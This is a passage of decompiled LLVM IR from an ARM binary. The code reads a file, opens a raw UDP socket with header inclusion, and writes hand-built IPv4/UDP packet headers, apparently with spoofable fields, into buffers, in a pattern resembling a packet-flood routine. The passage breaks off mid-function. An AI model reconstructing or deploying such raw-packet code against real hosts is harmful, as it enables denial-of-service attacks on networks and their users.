  store i32 %v0_eaac, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_eab8 = inttoptr i32 %v0_eaa8 to i32*
  %v6_eab8 = call i32 @function_ad24(i32 %v0_eaac, i32* %v5_eab8, i32 9, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_eabc = load i32, i32* @r5, align 4
  store i32 %v0_eabc, i32* %r1.global-to-local, align 4
  %v0_eac4 = load i32, i32* @r6, align 4
  store i32 %v0_eac4, i32* %r2.global-to-local, align 4
  %v0_eac8 = load i32, i32* @r4, align 4
  store i32 %v0_eac8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_ead0 = inttoptr i32 %v0_eabc to i32*
  %v6_ead0 = call i32 @function_ad24(i32 %v0_eac8, i32* %v5_ead0, i32 %v0_eac4, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_ead8 = load i32, i32* @r6, align 4
  store i32 %v0_ead8, i32* %r3.global-to-local, align 4
  %v0_eadc = load i32, i32* @r5, align 4
  store i32 %v0_eadc, i32* %r1.global-to-local, align 4
  %v0_eae4 = load i32, i32* @r4, align 4
  store i32 %v0_eae4, i32* %r0.global-to-local, align 4
  %v5_eae8 = inttoptr i32 %v0_eadc to i32*
  %v6_eae8 = call i32 @function_ac54(i32 %v0_eae4, i32* %v5_eae8, i32 8, i32 %v0_ead8, i32 %v6_ead0)
  store i32 %v6_eae8, i32* @r7, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_eaf4 = call i32 @function_12280(i32 37)
  %v0_eaf8 = load i32, i32* @r6, align 4
  store i32 %v0_eaf8, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v2_eb00 = inttoptr i32 %v0_eaf8 to i32*
  %v3_eb00 = call i32 @function_1219c(i32 37, i32* %v2_eb00)
  %v4_eb00 = inttoptr i32 %v3_eb00 to i8*
  store i32 %v3_eb00, i32* %r0.global-to-local, align 4
  %v0_eb04 = load i32, i32* @r6, align 4
  store i32 %v0_eb04, i32* %r1.global-to-local, align 4
  %v4_eb08 = call i32 (i8*, i32, ...) @open(i8* %v4_eb00, i32 %v0_eb04)
  store i32 %v4_eb08, i32* @r4, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_eb14 = call i32 @function_121c8(i32 37)
  store i32 %v1_eb14, i32* %r0.global-to-local, align 4
  %v0_eb18 = load i32, i32* @r4, align 4
  %v1_eb18 = load i32, i32* @r6, align 4
  %v9_eb18 = icmp eq i32 %v0_eb18, %v1_eb18
  store i1 %v9_eb18, i1* %cpsr_z.global-to-local, align 1
  %v5_eb1c = icmp slt i32 %v0_eb18, %v1_eb18
  br i1 %v5_eb1c, label %dec_label_pc_ebf0, label %dec_label_pc_eb20

dec_label_pc_eb20:                                ; preds = %dec_label_pc_e9b8
  %v2_eb24 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_eb24, i32* %sl.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_eb24, i32* %r1.global-to-local, align 4
  store i32 %v0_eb18, i32* %r0.global-to-local, align 4
  %v4_eb34 = call i32 @read(i32 %v0_eb18, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_eb34, i32* @r5, align 4
  %v0_eb3c = load i32, i32* @r4, align 4
  store i32 %v0_eb3c, i32* %r0.global-to-local, align 4
  %v1_eb40 = call i32 @close(i32 %v0_eb3c)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_eb48 = call i32 @function_12280(i32 38)
  %v0_eb4c = load i32, i32* @r6, align 4
  store i32 %v0_eb4c, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v2_eb54 = inttoptr i32 %v0_eb4c to i32*
  %v3_eb54 = call i32 @function_1219c(i32 38, i32* %v2_eb54)
  %v0_eb58 = load i32, i32* @r5, align 4
  store i32 %v0_eb58, i32* @r1, align 4
  store i32 %v3_eb54, i32* %r2.global-to-local, align 4
  store i32 %v2_eb24, i32* %r0.global-to-local, align 4
  %v3_eb64 = bitcast i32* %stack_var_-2120 to i8*
  %v4_eb64 = call i32 @function_13088(i8* %v3_eb64, i32 %v0_eb58, i32 %v3_eb54)
  store i32 %v4_eb64, i32* %r8.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_eb70 = call i32 @function_121c8(i32 38)
  store i32 %v1_eb70, i32* %r0.global-to-local, align 4
  %v7_eb74 = icmp eq i32 %v4_eb64, -1
  store i1 %v7_eb74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb74, label %dec_label_pc_ebf0, label %dec_label_pc_eb7c

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_eb20
  %v0_eb7c = load i32, i32* @r5, align 4
  %v9_eb7c = icmp eq i32 %v0_eb7c, %v4_eb64
  store i1 %v9_eb7c, i1* %cpsr_z.global-to-local, align 1
  %v7_eb80 = icmp sgt i32 %v0_eb7c, %v4_eb64
  br i1 %v7_eb80, label %dec_label_pc_eb84, label %dec_label_pc_ebf0

dec_label_pc_eb84:                                ; preds = %dec_label_pc_eb7c
  %v2_eb7c = sub i32 %v0_eb7c, %v4_eb64
  store i32 %v2_eb7c, i32* %r3.global-to-local, align 4
  %v2_eb8c = ptrtoint i32* %stack_var_-72 to i32
  %v0_eb90 = load i32, i32* @r6, align 4
  store i32 %v0_eb90, i32* %r1.global-to-local, align 4
  store i32 %v4_eb64, i32* %r2.global-to-local, align 4
  store i32 %v0_eb7c, i32* %r6.global-to-local, align 4
  %v0_eb9c = load i32, i32* %sl.global-to-local, align 4
  %v2_eb9c = add i32 %v0_eb9c, %v4_eb64
  store i32 %v2_eb9c, i32* %r0.global-to-local, align 4
  store i32 %v2_eb8c, i32* %r4.global-to-local, align 4
  %v1_ebac = add i32 %v0_eb7c, -1
  br label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_ebe0, %dec_label_pc_eb84
  %v0_ebe8 = phi i32 [ %v1_ebe8, %dec_label_pc_ebe0 ], [ %v2_eb8c, %dec_label_pc_eb84 ]
  %v0_ebe0 = phi i32 [ %v1_ebe0, %dec_label_pc_ebe0 ], [ %v4_eb64, %dec_label_pc_eb84 ]
  %v0_ebc8 = phi i32 [ %v0_ebc847, %dec_label_pc_ebe0 ], [ %v0_eb90, %dec_label_pc_eb84 ]
  %v0_eba8 = phi i32 [ %v0_eba843, %dec_label_pc_ebe0 ], [ %v0_eb90, %dec_label_pc_eb84 ]
  %v0_ebb0 = phi i32 [ %v1_ebb0, %dec_label_pc_ebe0 ], [ %v2_eb9c, %dec_label_pc_eb84 ]
  %v1_eba4 = inttoptr i32 %v0_ebb0 to i8*
  %v2_eba4 = load i8, i8* %v1_eba4, align 1
  %v3_eba4 = zext i8 %v2_eba4 to i32
  store i32 %v3_eba4, i32* %r3.global-to-local, align 4
  %v2_eba8 = icmp eq i32 %v0_eba8, 0
  store i1 %v2_eba8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ebac, i32* %lr.global-to-local, align 4
  %v1_ebb0 = add i32 %v0_ebb0, 1
  store i32 %v1_ebb0, i32* %r0.global-to-local, align 4
  %v1_ebb4 = add nsw i32 %v3_eba4, -48
  store i32 %v1_ebb4, i32* %ip.global-to-local, align 4
  br i1 %v2_eba8, label %dec_label_pc_ebbc, label %dec_label_pc_ebcc

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_eba4
  %v7_ebbc = icmp eq i8 %v2_eba4, 9
  store i1 %v7_ebbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebbc, label %dec_label_pc_ebe0, label %bb

bb:                                               ; preds = %dec_label_pc_ebbc
  %v8_ebc0 = icmp eq i8 %v2_eba4, 32
  store i1 %v8_ebc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ebc0, label %dec_label_pc_ebe0, label %dec_label_pc_ebc8

dec_label_pc_ebc8:                                ; preds = %bb
  %v1_ebc8 = add i32 %v0_ebc8, 1
  store i32 %v1_ebc8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ebcc

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_eba4, %dec_label_pc_ebc8
  %v0_ebc848 = phi i32 [ %v0_ebc8, %dec_label_pc_eba4 ], [ %v1_ebc8, %dec_label_pc_ebc8 ]
  %v0_eba844 = phi i32 [ %v0_eba8, %dec_label_pc_eba4 ], [ %v1_ebc8, %dec_label_pc_ebc8 ]
  %v7_ebcc = icmp eq i8 %v2_eba4, 46
  store i1 %v7_ebcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebcc, label %dec_label_pc_ebd8, label %bb130

bb130:                                            ; preds = %dec_label_pc_ebcc
  %v3_ebd0 = icmp ugt i32 %v1_ebb4, 8
  %v8_ebd0 = icmp eq i32 %v1_ebb4, 9
  store i1 %v8_ebd0, i1* %cpsr_z.global-to-local, align 1
  %v2_ebd4 = xor i1 %v8_ebd0, true
  %v3_ebd4 = and i1 %v3_ebd0, %v2_ebd4
  br i1 %v3_ebd4, label %dec_label_pc_f120, label %dec_label_pc_ebd8

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebcc, %bb130
  %v9_ebd8 = icmp eq i32 %v0_ebe0, %v1_ebac
  store i1 %v9_ebd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebd8, label %dec_label_pc_f120, label %dec_label_pc_ebe0

dec_label_pc_ebe0:                                ; preds = %dec_label_pc_ebbc, %dec_label_pc_ebd8, %bb
  %v0_ebc847 = phi i32 [ %v0_ebc8, %dec_label_pc_ebbc ], [ %v0_ebc848, %dec_label_pc_ebd8 ], [ %v0_ebc8, %bb ]
  %v0_eba843 = phi i32 [ 0, %dec_label_pc_ebbc ], [ %v0_eba844, %dec_label_pc_ebd8 ], [ 0, %bb ]
  %v1_ebe0 = add i32 %v0_ebe0, 1
  store i32 %v1_ebe0, i32* %r2.global-to-local, align 4
  %v9_ebe4 = icmp eq i32 %v0_eb7c, %v1_ebe0
  store i1 %v9_ebe4, i1* %cpsr_z.global-to-local, align 1
  %v1_ebe8 = add i32 %v0_ebe8, 1
  store i32 %v1_ebe8, i32* %r4.global-to-local, align 4
  br i1 %v9_ebe4, label %dec_label_pc_ebf0, label %dec_label_pc_eba4

dec_label_pc_ebf0:                                ; preds = %dec_label_pc_ebe0, %dec_label_pc_eb7c, %dec_label_pc_eb20, %dec_label_pc_e9b8
  %v0_ebf0 = call i32 @function_105b0()
  %v1_ebf4 = urem i32 %v0_ebf0, 4
  store i32 %v1_ebf4, i32* %r0.global-to-local, align 4
  %v2_ebf8 = icmp eq i32 %v1_ebf4, 3
  store i1 %v2_ebf8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_ebf0 to i2
  switch i2 %trunc, label %dec_label_pc_ec1c26 [
    i2 0, label %dec_label_pc_f158
    i2 1, label %dec_label_pc_ec14
    i2 -2, label %dec_label_pc_f148
    i2 -1, label %dec_label_pc_f16c
  ]

dec_label_pc_ec14:                                ; preds = %dec_label_pc_ebf0
  store i32 74, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ec1c

dec_label_pc_ec1c26:                              ; preds = %dec_label_pc_ebf0
  unreachable

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_f16c, %dec_label_pc_f158, %dec_label_pc_f148, %dec_label_pc_f120, %dec_label_pc_ec14
  %stack_var_-2188.0 = phi i32 [ 4, %dec_label_pc_f16c ], [ 64, %dec_label_pc_f148 ], [ 74, %dec_label_pc_ec14 ], [ 8, %dec_label_pc_f158 ], [ %phitmp, %dec_label_pc_f120 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ec20 = call i32 @time(i32* null)
  %v0_ec24 = load i32, i32* @r7, align 4
  %v2_ec24 = icmp eq i32 %v0_ec24, 0
  store i1 %v2_ec24, i1* %cpsr_z.global-to-local, align 1
  %v1_ec28 = load i32, i32* %fp.global-to-local, align 4
  %v2_ec28 = add i32 %v1_ec28, %v2_ec20
  store i32 %v2_ec28, i32* %r0.global-to-local, align 4
  br i1 %v2_ec24, label %dec_label_pc_f0fc, label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec1c
  store i32 %v0_ec24, i32* %r0.global-to-local, align 4
  %v1_ec38 = inttoptr i32 %v0_ec24 to i8*
  %v2_ec38 = call i32 @function_12d34(i8* %v1_ec38)
  %v3_ec38 = inttoptr i32 %v2_ec38 to i8*
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_ec4c = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_ec4c, i32* %r0.global-to-local, align 4
  %v7_ec50 = icmp eq i32 %v3_ec4c, -1
  store i1 %v7_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec50, label %dec_label_pc_f0fc, label %dec_label_pc_ec5c

dec_label_pc_ec5c:                                ; preds = %dec_label_pc_ec34
  store i32 1, i32* %lr.global-to-local, align 4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_ec68 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_ec68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_ec7c = call i32 @setsockopt(i32 %v3_ec4c, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_ec7c, i32* %r0.global-to-local, align 4
  %v7_ec80 = icmp eq i32 %v7_ec7c, -1
  store i1 %v7_ec80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec80, label %dec_label_pc_f0f4, label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec5c
  %v3_ec90 = mul i32 %v7_ea28, 65536
  store i32 %v3_ec90, i32* %r8.global-to-local, align 4
  %v3_ec9c = mul i32 %v6_ea84, 65536
  store i32 %v3_ec9c, i32* %r0.global-to-local, align 4
  %v3_eca0 = mul i32 %v6_ea9c, 65536
  store i32 %v3_eca0, i32* %sl.global-to-local, align 4
  %v3_eca4 = mul i32 %v6_eab8, 65536
  store i32 %v3_eca4, i32* %fp.global-to-local, align 4
  %v2_eca8 = icmp eq i32 %v1_e9c4, 0
  store i1 %v2_eca8, i1* %cpsr_z.global-to-local, align 1
  %v1_ecac = urem i32 %v6_ead0, 256
  store i32 %v1_ecac, i32* @sb, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ecb4 = urem i32 %v7_ea28, 65536
  store i32 %v3_ecb4, i32* %r5.global-to-local, align 4
  %v3_ecb8 = urem i32 %v6_ea84, 65536
  store i32 %v3_ecb8, i32* %ip.global-to-local, align 4
  %v3_ecbc = urem i32 %v6_ea9c, 65536
  store i32 %v3_ecbc, i32* %lr.global-to-local, align 4
  %v3_ecc0 = urem i32 %v6_eab8, 65536
  store i32 %v3_ecc0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_eca8, label %dec_label_pc_f108.critedge, label %dec_label_pc_ecdc

dec_label_pc_ecdc:                                ; preds = %dec_label_pc_ec88
  %v2_ece4 = add i32 %v2_ec38, %v1_ecac
  %v3_ece8 = mul i32 %v2_ece4, 65536
  %v1_ecec = add i32 %v3_ece8, 1769472
  %v1_ecf0 = add i32 %v3_ece8, 3080192
  %v1_ed0c = urem i32 %v6_eab8, 256
  %tmp131 = udiv i32 %v6_ea84, 256
  %v3_ed10 = urem i32 %tmp131, 256
  %v1_ed14 = urem i32 %v6_ea84, 256
  %v1_ed08 = mul i32 %v7_ea28, 256
  %v3_ed1c = and i32 %v1_ed08, 65280
  store i32 %v3_ed1c, i32* %r1.global-to-local, align 4
  %v1_ed24 = urem i32 %v6_ea9c, 256
  %tmp132 = udiv i32 %v7_ea28, 256
  %v3_ed2c = udiv i32 %v1_ecec, 256
  %v1_ed34 = and i32 %v3_ed2c, 65280
  %tmp133 = udiv i32 %v6_ea9c, 256
  %v4_ed44 = udiv i32 %v1_ecec, 16777216
  %v5_ed44 = or i32 %v1_ed34, %v4_ed44
  store i32 %v5_ed44, i32* %r6.global-to-local, align 4
  %v3_ed4c = sdiv i32 %v1_ecf0, 16777216
  %sext40 = mul i32 %tmp132, 16777216
  %v7_ed4c = sdiv i32 %sext40, 16777216
  %v3_ed50 = mul nuw nsw i32 %v1_ed0c, 256
  %v4_ed58 = mul nuw nsw i32 %v1_ed14, 256
  %v5_ed58 = or i32 %v4_ed58, %v3_ed10
  store i32 %v5_ed58, i32* %r0.global-to-local, align 4
  %v3_ed5c = ashr i32 %v1_ecf0, 31
  %tmp134 = udiv i32 %v6_eab8, 256
  %v4_ed60 = urem i32 %tmp134, 256
  %v5_ed60 = or i32 %v4_ed60, %v3_ed50
  store i32 %v5_ed60, i32* %r5.global-to-local, align 4
  %v3_ed64 = ashr i32 %sext40, 31
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_ed6c = add i32 %v2_ec38, 1
  store i32 %v2_ed6c, i32* %fp.global-to-local, align 4
  store i32 %v1_ed24, i32* %r3.global-to-local, align 4
  store i32 %v1_ed14, i32* %r2.global-to-local, align 4
  %v3_ed8070 = udiv i32 %v1_ed34, 256
  store i32 %v3_ed8070, i32* %ip.global-to-local, align 4
  store i32 %v1_ed0c, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v5_ed8c = trunc i32 %tmp131 to i8
  store i32 0, i32* %sl.global-to-local, align 4
  %sext19 = mul i32 %v6_ea40, 16777216
  %v4_ee0c = sdiv i32 %sext19, 16777216
  %sext20 = mul i32 %v1_ecec, 256
  %v4_ee3c = sdiv i32 %sext20, 16777216
  %sext22 = mul i32 %v6_ea9c, 16777216
  %v4_ee58 = sdiv i32 %sext22, 16777216
  %sext23 = mul nuw i32 %v4_ed44, 16777216
  %v4_ee5c = sdiv i32 %sext23, 16777216
  %sext25 = mul i32 %v6_eab8, 16777216
  %v4_ee7c = sdiv i32 %sext25, 16777216
  %v1_ee00 = trunc i32 %v3_ed5c to i8
  %extract.t = trunc i32 %v3_ed64 to i8
  %v1_ee60 = trunc i32 %tmp133 to i8
  %v1_ee88 = trunc i32 %v6_ea84 to i8
  br label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %dec_label_pc_ef0c, %dec_label_pc_ecdc
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_edb4 = call i32* @calloc(i32 600, i32 1)
  %v4_edb4 = ptrtoint i32* %v2_edb4 to i32
  store i32 %v4_edb4, i32* %r0.global-to-local, align 4
  store i32 %v4_e9ec, i32* %r2.global-to-local, align 4
  %v3_edbc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_edbc, i32* %r3.global-to-local, align 4
  %v2_edc0 = load i32, i32* %r4.global-to-local, align 4
  %v5_edc0 = mul i32 %v2_edc0, 4
  %v6_edc0 = add i32 %v5_edc0, %v4_e9ec
  %v7_edc0 = inttoptr i32 %v6_edc0 to i32*
  store i32 %v4_edb4, i32* %v7_edc0, align 4
  %v0_edc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_edc4 = load i32, i32* %r3.global-to-local, align 4
  %v4_edc4 = mul i32 %v1_edc4, 4
  %v5_edc4 = add i32 %v4_edc4, %v0_edc4
  %v6_edc4 = inttoptr i32 %v5_edc4 to i32*
  %v7_edc4 = load i32, i32* %v6_edc4, align 4
  store i32 %v7_edc4, i32* %r1.global-to-local, align 4
  %v1_edc8 = inttoptr i32 %v7_edc4 to i8*
  %v2_edc8 = load i8, i8* %v1_edc8, align 1
  %tmp = urem i8 %v2_edc8, 16
  %v1_edcc = zext i8 %tmp to i32
  %v1_edd0 = or i32 %v1_edcc, 64
  store i32 %v1_edd0, i32* %r2.global-to-local, align 4
  %v1_edd4 = trunc i32 %v1_edd0 to i8
  store i8 %v1_edd4, i8* %v1_edc8, align 1
  %v0_edd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_edd8 = inttoptr i32 %v0_edd8 to i8*
  %v2_edd8 = load i8, i8* %v1_edd8, align 1
  %v1_eddc = and i8 %v2_edd8, -16
  %v1_ede0 = or i8 %v1_eddc, 5
  store i32 %v1_ea6c, i32* %ip.global-to-local, align 4
  store i8 %v1_ede0, i8* %v1_edd8, align 1
  %v2_edf0 = load i32, i32* %r1.global-to-local, align 4
  %v3_edf0 = add i32 %v2_edf0, 1
  %v4_edf0 = inttoptr i32 %v3_edf0 to i8*
  store i8 %v5_ea24, i8* %v4_edf0, align 1
  store i32 %v3_ed5c, i32* %r3.global-to-local, align 4
  store i32 %v3_ed4c, i32* %r2.global-to-local, align 4
  %v0_edfc = load i32, i32* %ip.global-to-local, align 4
  %v2_edfc = icmp eq i32 %v0_edfc, 0
  store i1 %v2_edfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ee00 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee00 = add i32 %v2_ee00, 3
  %v4_ee00 = inttoptr i32 %v3_ee00 to i8*
  store i8 %v1_ee00, i8* %v4_ee00, align 1
  %v0_ee04 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee04 = trunc i32 %v0_ee04 to i8
  %v2_ee04 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee04 = add i32 %v2_ee04, 2
  %v4_ee04 = inttoptr i32 %v3_ee04 to i8*
  store i8 %v1_ee04, i8* %v4_ee04, align 1
  store i32 %v3_ed64, i32* %lr.global-to-local, align 4
  store i32 %v4_ee0c, i32* %r2.global-to-local, align 4
  %v0_ee10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee10, label %.thread27, label %bb135

bb135:                                            ; preds = %dec_label_pc_edac
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_ee14 = load i32, i32* %r1.global-to-local, align 4
  %v4_ee14 = add i32 %v3_ee14, 6
  %v5_ee14 = inttoptr i32 %v4_ee14 to i8*
  store i8 64, i8* %v5_ee14, align 1
  %v0_ee1c.pre = load i32, i32* %lr.global-to-local, align 4
  %extract.t71 = trunc i32 %v0_ee1c.pre to i8
  br label %.thread27

.thread27:                                        ; preds = %dec_label_pc_edac, %bb135
  %v0_ee1c.off0 = phi i8 [ %extract.t, %dec_label_pc_edac ], [ %extract.t71, %bb135 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_ee1c = load i32, i32* %r1.global-to-local, align 4
  %v3_ee1c = add i32 %v2_ee1c, 5
  %v4_ee1c = inttoptr i32 %v3_ee1c to i8*
  store i8 %v0_ee1c.off0, i8* %v4_ee1c, align 1
  store i32 %v7_ed4c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c21c.135 to i32), i32* %lr.global-to-local, align 4
  %v0_ee28 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee28 = trunc i32 %v0_ee28 to i8
  %v2_ee28 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee28 = add i32 %v2_ee28, 8
  %v4_ee28 = inttoptr i32 %v3_ee28 to i8*
  store i8 %v1_ee28, i8* %v4_ee28, align 1
  %v0_ee2c = load i32, i32* %r3.global-to-local, align 4
  %v1_ee2c = trunc i32 %v0_ee2c to i8
  %v2_ee2c = load i32, i32* %r1.global-to-local, align 4
  %v3_ee2c = add i32 %v2_ee2c, 9
  %v4_ee2c = inttoptr i32 %v3_ee2c to i8*
  store i8 %v1_ee2c, i8* %v4_ee2c, align 1
  %v0_ee30 = load i32, i32* %r1.global-to-local, align 4
  %v1_ee30 = add i32 %v0_ee30, 41
  %v2_ee34 = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_ee34, i32* %r3.global-to-local, align 4
  %v0_ee38 = load i32, i32* @sb, align 4
  %v2_ee38 = add i32 %v1_ee30, %v0_ee38
  store i32 %v2_ee38, i32* %r4.global-to-local, align 4
  store i32 %v4_ee3c, i32* %r2.global-to-local, align 4
  %v1_ee40 = add i32 %v0_ee30, 20
  store i32 %v1_ee40, i32* %r0.global-to-local, align 4
  %v0_ee44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee44, label %bb137, label %bb136

bb136:                                            ; preds = %.thread27
  %v1_ee44 = load i32, i32* %sl.global-to-local, align 4
  %v2_ee44 = trunc i32 %v1_ee44 to i8
  %v4_ee44 = add i32 %v0_ee30, 7
  %v5_ee44 = inttoptr i32 %v4_ee44 to i8*
  store i8 %v2_ee44, i8* %v5_ee44, align 1
  %v2_ee48.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %.thread27, %bb136
  %v2_ee48 = phi i32 [ %v0_ee30, %.thread27 ], [ %v2_ee48.pre, %bb136 ]
  %v0_ee48 = load i32, i32* %ip.global-to-local, align 4
  %v1_ee48 = trunc i32 %v0_ee48 to i8
  %v3_ee48 = add i32 %v2_ee48, 4
  %v4_ee48 = inttoptr i32 %v3_ee48 to i8*
  store i8 %v1_ee48, i8* %v4_ee48, align 1
  %v0_ee4c = load i32, i32* %r3.global-to-local, align 4
  %v1_ee4c = load i32, i32* %r1.global-to-local, align 4
  %v2_ee4c = add i32 %v1_ee4c, 12
  %v3_ee4c = inttoptr i32 %v2_ee4c to i32*
  store i32 %v0_ee4c, i32* %v3_ee4c, align 4
  %v0_ee50 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee50 = trunc i32 %v0_ee50 to i8
  %v2_ee50 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee50 = add i32 %v2_ee50, 5
  %v4_ee50 = inttoptr i32 %v3_ee50 to i8*
  store i8 %v1_ee50, i8* %v4_ee50, align 1
  store i32 %v4_ee58, i32* %lr.global-to-local, align 4
  store i32 %v4_ee5c, i32* %r2.global-to-local, align 4
  %v2_ee60 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee60 = add i32 %v2_ee60, 2
  %v4_ee60 = inttoptr i32 %v3_ee60 to i8*
  store i8 %v1_ee60, i8* %v4_ee60, align 1
  %v0_ee64 = load i32, i32* %lr.global-to-local, align 4
  %v1_ee64 = trunc i32 %v0_ee64 to i8
  %v2_ee64 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee64 = add i32 %v2_ee64, 3
  %v4_ee64 = inttoptr i32 %v3_ee64 to i8*
  store i8 %v1_ee64, i8* %v4_ee64, align 1
  %v0_ee68 = load i32, i32* %r2.global-to-local, align 4
  %v1_ee68 = trunc i32 %v0_ee68 to i8
  %v2_ee68 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee68 = add i32 %v2_ee68, 4
  %v4_ee68 = inttoptr i32 %v3_ee68 to i8*
  store i8 %v1_ee68, i8* %v4_ee68, align 1
  store i32 %stack_var_-2188.0, i32* %lr.global-to-local, align 4
  %v2_ee74 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee74 = add i32 %v2_ee74, 20
  %v4_ee74 = inttoptr i32 %v3_ee74 to i8*
  store i8 %v5_ed8c, i8* %v4_ee74, align 1
  store i32 %v4_ee7c, i32* %r3.global-to-local, align 4
  %v0_ee80 = load i32, i32* %r1.global-to-local, align 4
  %v1_ee80 = add i32 %v0_ee80, 28
  store i32 %v1_ee80, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_ee88 = load i32, i32* %r0.global-to-local, align 4
  %v3_ee88 = add i32 %v2_ee88, 1
  %v4_ee88 = inttoptr i32 %v3_ee88 to i8*
  store i8 %v1_ee88, i8* %v4_ee88, align 1
  %v0_ee8c = load i32, i32* %lr.global-to-local, align 4
  %v1_ee8c = load i32, i32* %r1.global-to-local, align 4
  %v2_ee8c = add i32 %v1_ee8c, 16
  %v3_ee8c = inttoptr i32 %v2_ee8c to i32*
  store i32 %v0_ee8c, i32* %v3_ee8c, align 4
  %v0_ee90 = load i32, i32* %r8.global-to-local, align 4
  %v1_ee90 = trunc i32 %v0_ee90 to i8
  %v2_ee90 = load i32, i32* %ip.global-to-local, align 4
  %v3_ee90 = add i32 %v2_ee90, 5
  %v4_ee90 = inttoptr i32 %v3_ee90 to i8*
  store i8 %v1_ee90, i8* %v4_ee90, align 1
  %v0_ee94 = load i32, i32* %r5.global-to-local, align 4
  %v1_ee94 = trunc i32 %v0_ee94 to i8
  %v2_ee94 = load i32, i32* %r1.global-to-local, align 4
  %v3_ee94 = add i32 %v2_ee94, 28
  %v4_ee94 = inttoptr i32 %v3_ee94 to i8*
  store i8 %v1_ee94, i8* %v4_ee94, align 1
  %v0_ee98 = load i32, i32* %r8.global-to-local, align 4
  %v1_ee98 = trunc i32 %v0_ee98 to i8
  %v2_ee98 = load i32, i32* %ip.global-to-local, align 4
  %v3_ee98 = add i32 %v2_ee98, 2
  %v4_ee98 = inttoptr i32 %v3_ee98 to i8*
  store i8 %v1_ee98, i8* %v4_ee98, align 1
  %v0_ee9c = load i32, i32* %r3.global-to-local, align 4
  %v1_ee9c = trunc i32 %v0_ee9c to i8
  %v2_ee9c = load i32, i32* %ip.global-to-local, align 4
  %v3_ee9c = add i32 %v2_ee9c, 1
  %v4_ee9c = inttoptr i32 %v3_ee9c to i8*
  store i8 %v1_ee9c, i8* %v4_ee9c, align 1
  %v0_eea0 = load i32, i32* %r6.global-to-local, align 4
  %v1_eea0 = trunc i32 %v0_eea0 to i8
  %v2_eea0 = load i32, i32* %ip.global-to-local, align 4
  %v3_eea0 = add i32 %v2_eea0, 3
